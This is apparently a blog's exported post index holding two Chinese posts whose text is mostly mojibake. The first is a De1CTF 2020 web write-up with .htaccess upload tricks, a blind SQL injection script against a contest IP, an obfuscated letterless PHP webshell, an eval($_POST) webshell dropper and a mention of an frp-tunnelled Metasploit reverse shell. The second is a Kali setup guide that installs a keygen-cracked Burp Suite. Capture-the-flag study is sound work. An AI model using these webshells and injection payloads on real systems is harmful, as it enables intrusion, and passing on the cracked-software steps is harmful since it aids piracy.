<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>De1CTF2020-WP</title>
    <url>/2020/05/De1CTF2020-WP/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h4 id="1-check-in"><a href="#1-check-in" class="headerlink" title="1.check in"></a>1.check in</h4><p>é¢˜ç›®è¿‡æ»¤å¾ˆå¤šå…³é”®å­—</p><p><img src="/2020/05/De1CTF2020-WP/image-20200507215250934.png" alt="image-20200507215250934"></p><p>é¦–å…ˆæƒ³åˆ°çš„æ˜¯ä¸Šä¼ .htaccessä½†æ˜¯æŠŠphç»™è¿‡æ»¤äº†ï¼Œåé¢æƒ³ä¸Šä¼ user.ini ä½†autoè¢«ç¦äº†</p><p>åé¢çœ‹äº†<a href="https://www.cnblogs.com/20175211lyz/p/11741348.html" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a>åˆ©ç”¨ æ¢è¡Œç¬¦â€&quot;ç»•è¿‡ph</p><p><img src="/2020/05/De1CTF2020-WP/image-20200507215853923.png" alt="image-20200507215853923"></p><p><img src="/2020/05/De1CTF2020-WP/image-20200507215952735.png" alt="image-20200507215952735"></p><p><img src="/2020/05/De1CTF2020-WP/image-20200507215058705.png" alt="image-20200507215058705"></p><p>ä½†è¿™é¢˜çš„é¢„æœŸè§£æ˜¯ä¸Šä¼ .htaccess</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .sh</span><br></pre></td></tr></table></figure><a id="more"></a>









<p> è§£æshellè„šæœ¬</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Content-Type: text/plain"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span></span><br><span class="line">cat /flag</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>å¯è¿™é¢˜çš„æœ‰å‘ï¼Œå®˜æ–¹wpè¯´linuxä¸­cgiæ¯”è¾ƒä¸¥æ ¼ï¼Œåœ¨windowä¸‹ç¼–è¾‘è„šæœ¬ä¼šå› ä¸ºç¼–ç é—®é¢˜æœåŠ¡å™¨è§£æå¤±è´¥ï¼Œå¿…é¡»åœ¨linuxç¯å¢ƒä¸‹ç¼–è¾‘è„šæœ¬å†ä¸Šä¼ ã€‚</p>
<p>è¿˜æœ‰ä¸€ä¸ªéé¢„æœŸæ˜¯ç›´æ¥ä¸Šåˆ«äººçš„è½¦ã€‚ã€‚ã€‚</p>
<p>ä¸Šä¼ .htaccess</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> server-status</span><br></pre></td></tr></table></figure>

<p>æ‰“å¼€è‡ªå·±çš„ä¸Šä¼ å°±èƒ½çœ‹åˆ°apacheçš„æœåŠ¡å™¨çŠ¶æ€ï¼Œå¯ä»¥çœ‹åˆ°å…¶ä»–äººçš„è®¿é—®ç½‘ç«™çš„è®°å½•ï¼Œç„¶åç™½å«–flag</p>
<p>è¿™åº”è¯¥æ˜¯åé¢ä¸ºå•¥5åˆ†é’Ÿé‡å¯ä¸€æ¬¡æœåŠ¡çš„åŸå› å§</p>
<h4 id="2-Mixture"><a href="#2-Mixture" class="headerlink" title="2.Mixture"></a>2.Mixture</h4><p>åœ¨member.phpçš„htmlæºç ä¸­æœ‰orderbyæ³¨é‡Šï¼Œåº”è¯¥æ˜¯sqlæ³¨å…¥adminçš„å¯†ç </p>
<p>æµ‹è¯•è¿‡æ»¤çš„å…³é”®å­— hex unhex desc exp è¿˜æœ‰ä¸‹é¢çš„</p>
<p><img src="/2020/05/De1CTF2020-WP/image-20200507221939844.png" alt="image-20200507221939844"></p>
<p>ç›²æ³¨è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://134.175.185.244/index.php"</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"username"</span>:<span class="string">"xxxxx"</span>,</span><br><span class="line">    <span class="string">"password"</span>:<span class="string">"xxxxxxx"</span>,</span><br><span class="line">    <span class="string">"submit"</span>:<span class="string">"submit"</span></span><br><span class="line">&#125;</span><br><span class="line">cookie =&#123;</span><br><span class="line">    <span class="string">"PHPSESSID"</span>: <span class="string">"sou26piclav6f99h79k1l5vmbn"</span></span><br><span class="line">&#125;</span><br><span class="line">requests.post(url,data=data,cookies=cookie)</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">url=<span class="string">"http://134.175.185.244/member.php?orderby="</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'0123456789abcdefghijklmnopqrstuvwxyz,'</span>:</span><br><span class="line">        payload=<span class="string">"|(mid((select password from member),&#123;&#125;,1)='&#123;&#125;')%2b3"</span>.format(i,j)</span><br><span class="line">        true_url=url+payload</span><br><span class="line">        r=requests.get(true_url,cookies=cookie)</span><br><span class="line">        <span class="keyword">if</span> r.content.index(<span class="string">'tomcat'</span>)&lt;r.content.index(<span class="string">'1000000'</span>):</span><br><span class="line">            <span class="keyword">print</span> payload+<span class="string">' ok'</span></span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> payload</span><br><span class="line">//<span class="number">18</span>a960a3a0b3554b314ebe77fe545c85</span><br></pre></td></tr></table></figure>

<p>è·‘å‡ºæ¥çš„å¯†ç ç»è¿‡md5è§£å¯†æ˜¯goodlucktoyou</p>
<h4 id="3-Animal-Crossing"><a href="#3-Animal-Crossing" class="headerlink" title="3.Animal Crossing"></a>3.Animal Crossing</h4><h4 id="4-Hard-Pentest-1"><a href="#4-Hard-Pentest-1" class="headerlink" title="4.Hard_Pentest_1"></a>4.Hard_Pentest_1</h4><p>æ–‡ä»¶ä¸Šä¼ æ–‡ä»¶åä¸èƒ½åŒ…å« <code>..\</code> æ–‡ä»¶å†…å®¹å†…å®¹ä¸èƒ½åŒ…å« <code>æ•°å­—å­—æ¯;~^&amp;|\åå¼•å·</code></p>
<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™æ˜¯ä¸€ä¸ªwindowæœåŠ¡å™¨</p>
<p>æ–‡ä»¶åç»•è¿‡</p>
<p>1.åˆ©ç”¨windowå¯¹äºæ–‡ä»¶å’Œæ–‡ä»¶åçš„é™åˆ¶ï¼Œåœ¨ä»¥<code>::$DATA</code>å­—ç¬¦æ”¾åœ¨ç»“å°¾æ—¶ï¼Œä¸ç¬¦åˆæ“ä½œç³»ç»Ÿå‘½åè§„èŒƒï¼Œåœ¨æœ€åç”Ÿæˆæ–‡ä»¶æ—¶ï¼Œå­—ç¬¦ä¼šè¢«è‡ªåŠ¨åˆ é™¤</p>
<p>2.åˆ©ç”¨windowä¸åŒºåˆ†å¤§å°å†™ç»•è¿‡</p>
<p>æ–‡ä»¶å†…å®¹ç»•è¿‡å¯ä»¥å‚è€ƒPç¥çš„æ— æ•°å­—å­—æ¯webshellï¼Œåˆ©ç”¨phpçŸ­æ ‡ç­¾ç»•è¿‡ <code>;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=$_=[]<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$_=@<span class="string">"$_"</span><span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$_=$_[<span class="string">'!'</span>==<span class="string">'@'</span>]<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>= $___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____=<span class="string">'_'</span><span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$_=$$____<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$_[__]($_[_])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/De1CTF2020-WP/image-20200511210746555.png" alt="image-20200511210746555"></p>
<p>å†åˆ©ç”¨è¿™ä¸ªé©¬å†™ä¸€ä¸ªæ–°çš„é©¬</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">__</span>=system&amp;_=echo ^&lt;?php eval(<span class="variable">$_POST</span>[<span class="string">'a'</span>])<span class="comment">; &gt; a.php</span></span><br></pre></td></tr></table></figure>

<p>åœ¨windowä¸‹ <code>^</code>è¡¨ç¤ºè½¬ä¹‰</p>
<p>èšå‰‘è¿ä¸Šåæ²¡æ‰¾åˆ°flagï¼Œå¯èƒ½æ˜¯å†…ç½‘æ¸—é€ã€‚åˆ©ç”¨frpåå¼¹äº†ä¸ªmsf shell</p>
<p><img src="/2020/05/De1CTF2020-WP/image-20200511224151774.png" alt="image-20200511224151774"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>De1</tag>
      </tags>
  </entry>
  <entry>
    <title>kaliå®‰è£…ä¸é…ç½®</title>
    <url>/2020/04/kali%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ä¸¤ä¸ªæœˆå‰ æˆ‘è¾“å…¥äº†è¿™æ¡ç¥å¥‡çš„å‘½ä»¤ <code>rm /*</code>å°‘äº†ä¸€ä¸ªç‚¹ï¼Œç„¶åé‡è£…äº†ä¸€ä¸‹kali</p><p>æ˜¨å¤©å®‰è£…è½¯ä»¶çš„æ—¶å€™çªç„¶å‘ç° <code>/dev/sda1</code>ç©ºé—´ç”¨å®Œäº† åäº†</p><p>å†ä¹Ÿä¸ç©é«˜çº§çš„åˆ†åŒºæ¨¡å¼äº†</p><p>ä»Šå¤©é‡æ–°å®‰è£…ï¼Œåˆ†åŒºé€‰æ–°æ‰‹æ¨¡å¼äº†ï¼</p><p>è¿™é‡Œä¸»è¦è®°å½•ä¸€ä¸‹å¦‚ä½•é…ç½®kali</p><h3 id="1-å®‰è£…è°·æ­Œè¾“å…¥æ³•"><a href="#1-å®‰è£…è°·æ­Œè¾“å…¥æ³•" class="headerlink" title="1.å®‰è£…è°·æ­Œè¾“å…¥æ³•"></a>1.å®‰è£…è°·æ­Œè¾“å…¥æ³•</h3><p>å¦‚æœä¸‹è½½é€Ÿåº¦æ…¢ï¼Œé€‰æ‹©æŒ‚ä»£ç†æˆ–è€…æ¢æº</p><ol>
<li><p>å…ˆæ›´æ–°ä»“åº“</p>
<p> <code>sudo apt-get clean</code></p>
<p> <code>sudo apt-get update</code></p>
<p> <img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422165456991.png" alt="image-20200422165456991"></p>
</li>
</ol><a id="more"></a>






<ol start="2">
<li><p>å®‰è£…fcitx</p>
<p> <code>sudo apt-get install fcitx</code></p>
<p> <img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422165915271.png" alt="image-20200422165915271"></p>
</li>
</ol>
<ol start="3">
<li><p>å®‰è£…è°·æ­Œæ‹¼éŸ³</p>
<p> <code>sudo apt-get install fcitx-googlepinyin</code></p>
<p> <img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422170051383.png" alt="image-20200422170051383"></p>
</li>
</ol>
<ol start="4">
<li><p>é…ç½®fcitx</p>
<p> <code>fcitx-config-gtk3</code></p>
<p> è®¾ç½®Googleæ‹¼éŸ³åˆ°ç¬¬ä¸€ä½</p>
<p> ![image-20200422170623716](kaliå®‰è£…ä¸é…ç½®/image-20200422170623716.png</p>
</li>
<li><p>é‡å¯</p>
<p> <code>sudo reboot</code></p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422171933298.png" alt="image-20200422171933298"></p>
</li>
</ol>
<h3 id="2-å®‰è£…ç ´è§£ç‰ˆBurpSuit"><a href="#2-å®‰è£…ç ´è§£ç‰ˆBurpSuit" class="headerlink" title="2.å®‰è£…ç ´è§£ç‰ˆBurpSuit"></a>2.å®‰è£…ç ´è§£ç‰ˆBurpSuit</h3><ol>
<li><p>å®‰è£…JAVA8</p>
<p> <code>cd /opt/</code></p>
<p> <code>sudo wget https://repo.huaweicloud.com/java/jdk/8u202-b08/jdk-8u202-linux-x64.tar.gz</code></p>
<p> <img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422173241147.png" alt="image-20200422173241147"></p>
</li>
</ol>
<ol start="2">
<li><p>è§£å‹</p>
<p> <code>sudo tar -zxvf jdk-8u202-linux-x64.tar.gz</code></p>
</li>
<li><p>è®¾ç½®ç¯å¢ƒå˜é‡</p>
<p>  <code>sudo mousepad ~/.bashrc</code></p>
<p> æœ€ä¸‹é¢åŠ ä¸Š</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#JAVA</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/opt/jdk1.8.0_202</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin/:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>

<p> <img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422174554381.png" alt="image-20200422174554381"></p>
</li>
<li><p>ä¿®æ”¹/etc/profile</p>
<p> <code>sudo mousepad /etc/profile</code></p>
<p> æ·»åŠ </p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åŠ è½½.bashrcæ–‡ä»¶</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -f .bashrc ; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">source</span> .bashrc </span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p> é¿å…æ¯æ¬¡è¿›shelléƒ½è¦æ›´æ–°é…ç½®æ–‡ä»¶</p>
<p> <img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422175335303.png" alt="image-20200422175335303"></p>
</li>
<li><p>å®‰è£…å¹¶æ³¨å†Œ</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_202/bin/java 1</span><br><span class="line"></span><br><span class="line">sudo update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_202/bin/javac 1</span><br><span class="line"></span><br><span class="line">sudo update-alternatives --<span class="built_in">set</span> java /opt/jdk1.8.0_202/bin/java</span><br><span class="line"></span><br><span class="line">sudo update-alternatives --<span class="built_in">set</span> javac /opt/jdk1.8.0_202/bin/javac</span><br></pre></td></tr></table></figure>

<p> <img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422175852100.png" alt="image-20200422175852100"></p>
</li>
<li><p>ç ´è§£burpsuit</p>
<p><code>sudo mkdir /opt/burpsuit</code></p>
<p><code>sudo mv burp-loader-keygen-2020_1.jar burpsuite_pro_v2020.1.jar /opt/burpsuit/</code></p>
</li>
</ol>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422183206266.png" alt="image-20200422183206266"></p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422193327897.png" alt="image-20200422193327897"></p>
<p>è¿è¡ŒåŠ è½½å™¨åï¼Œæ­£å¸¸ç ´è§£å³å¯</p>
<p>7.åˆ›å»ºå¿«æ·æ–¹å¼</p>
<p><code>sudo rm -rf /usr/bin/burpsuite</code> </p>
<p> <code>sudo touch /usr/bin/burpsuite</code></p>
<p> <code>sudo mousepad /usr/bin/burpsuite</code></p>
<p>æ·»åŠ ä»¥ä¸‹å†…å®¹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">cd</span> /opt/burpsuit &amp;&amp; java -noverify -Xbootclasspath/p:burp-loader-keygen-2020_1.jar -jar burpsuite_pro_v2020.1.jar</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422194026070.png" alt></p>
<p>å¢åŠ æ‰§è¡Œæƒé™</p>
<p><code>sudo chmod +x /usr/bin/burpsuite</code></p>
<p>ä¿®æ”¹å¿«æ·æ–¹å¼</p>
<p><code>sudo mousepad /usr/share/applications/kali-burpsuite.desktop</code> </p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422194502658.png" alt="image-20200422194502658"></p>
<p>æŠŠ<code>Exec=sh -c &quot;java -jar /usr/bin/burpsuite</code>æ”¹ä¸º<code>Exec=sh -c &quot;/usr/bin/burpsuite</code></p>
<p>ç„¶åå‘½ä»¤è¡Œå’Œå›¾æ ‡éƒ½èƒ½è¿è¡Œäº†</p>
<h3 id="3-å®‰è£…Subline-text3"><a href="#3-å®‰è£…Subline-text3" class="headerlink" title="3.å®‰è£…Subline text3"></a>3.å®‰è£…Subline text3</h3><ol>
<li><p>å®‰è£…GPG</p>
<p> <code>wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -</code></p>
<p> <img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422195424105.png" alt="image-20200422195424105"></p>
</li>
<li><p>ç¡®ä¿aptè¢«è®¾ç½®ä¸ºhttpsæº</p>
<p>  <code>sudo apt-get install apt-transport-https</code></p>
</li>
</ol>
<p>â€‹    </p>
<ol start="3">
<li><p>é€‰æ‹©ç¨³å®šç‰ˆæœ¬</p>
<p><code>echo &quot;deb https://download.sublimetext.com/ apt/stable/&quot; | sudo tee /etc/apt/sources.list.d/sublime-text.list</code></p>
</li>
<li><p>å®‰è£…sublime-text3</p>
<p> <code>sudo apt-get update</code></p>
<p> <code>sudo apt-get install sublime-text</code></p>
<p> å¯èƒ½ä¼šå¾ˆæ…¢ï¼Œå»ºè®®ä»£ç†</p>
</li>
<li><p>æ±‰åŒ–sublime</p>
<p>æŒ‰ctrl+shift+p,è°ƒå‡ºéšè—çª—å£,å…ˆå®‰è£…åŒ…æ§åˆ¶<br><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422201255164.png" alt="image-20200422201255164"></p>
<p>Perferences-&gt;Package Control-&gt;install Package<br><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422201619067.png" alt="image-20200422201619067"></p>
<p>ä¹‹åè¾“å…¥ Localizations å®‰è£…å¯¹åº”æ’ä»¶ å›è½¦ç¡®è®¤ å³å¯å®ç°æ±‰åŒ–</p>
</li>
<li><p>å®‰è£…SublimeREPL åŒç†</p>
<p> é…ç½®python3ç¯å¢ƒ</p>
<p> <code>vim .config/sublime-text-3/Packages/SublimeREPL/config/Python/Main.sublime-menu</code></p>
<p> æŠŠcmd å¼€å¤´çš„å­—ç¬¦ä¸²ä¸­çš„pythonæ”¹æˆpython3</p>
<p> <img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200507210324333.png" alt="image-20200507210324333"></p>
</li>
<li><p>å®‰è£…anaconda</p>
<p> é…ç½®anaconda, é¦–é€‰é¡¹-&gt;Package Settings -&gt; Anaconda -&gt;Settings -User</p>
<p> ç²˜è´´ä»¥ä¸‹å†…å®¹</p>
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;    </span><br><span class="line"><span class="attr">"anaconda_linting"</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">"python_interpreter"</span>: <span class="string">"/usr/bin/python3.7"</span>,</span><br><span class="line"><span class="attr">"suppress_explicit_completions"</span>:<span class="literal">true</span>,</span><br><span class="line"><span class="attr">"suppress_word_completion"</span>:<span class="literal">true</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

